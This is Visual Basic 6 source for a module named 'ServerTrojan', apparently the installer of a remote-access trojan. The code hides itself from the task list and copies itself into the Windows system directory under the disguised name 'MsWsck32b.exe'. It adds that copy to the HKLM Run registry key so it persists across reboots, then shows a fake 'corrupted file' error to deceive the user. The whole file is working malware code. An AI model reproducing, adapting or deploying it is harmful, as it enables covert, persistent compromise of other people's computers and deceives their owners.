Attribute VB_Name = "ServerTrojan"
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const REG_SZ = 1
Dim StrValue As String
Dim strPath As String
Dim hCurKey As Long
Dim lRegResult As Long
Dim StrData As String
Dim hKey As Long

Const FORMAT_MESSAGE_FROM_SYSTEM = &H1000
Const LANG_NEUTRAL = &H0
Private Declare Function GetLastError Lib "kernel32" () As Long
Private Declare Sub SetLastError Lib "kernel32" (ByVal dwErrCode As Long)
Private Declare Function FormatMessage Lib "kernel32" Alias "FormatMessageA" (ByVal dwFlags As Long, lpSource As Any, ByVal dwMessageId As Long, ByVal dwLanguageId As Long, ByVal lpBuffer As String, ByVal nSize As Long, Arguments As Long) As Long


Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public sysDir As String

Sub Main()
'On Error Resume Next
App.TaskVisible = False
sysDir = Space(500)
sysDir = Left(sysDir, GetSystemDirectory(sysDir, Len(sysDir)))
If (UCase(App.Path) <> UCase(sysDir)) Then
    Call Install
    Dim fmsg As String
    fmsg = Space(200)
    SetLastError 1392&
    FormatMessage FORMAT_MESSAGE_FROM_SYSTEM, ByVal 0&, GetLastError(), LANG_NEUTRAL, fmsg, 200, ByVal 0&
    MsgBox fmsg, vbCritical, App.EXEName
Else
Load frmtr

End If

End Sub

Private Sub Install()
On Error Resume Next
FileCopy App.EXEName & ".exe", sysDir & "\MsWsck32b.exe"
hKey = HKEY_LOCAL_MACHINE
StrValue = "Wsock32"
strPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
StrData = sysDir & "\MsWsck32b.exe"
lRegResult = RegCreateKey(hKey, strPath, hCurKey)
lRegResult = RegSetValueEx(hCurKey, StrValue, 0, REG_SZ, ByVal StrData, Len(StrData))
lRegResult = RegCloseKey(hCurKey)
End Sub
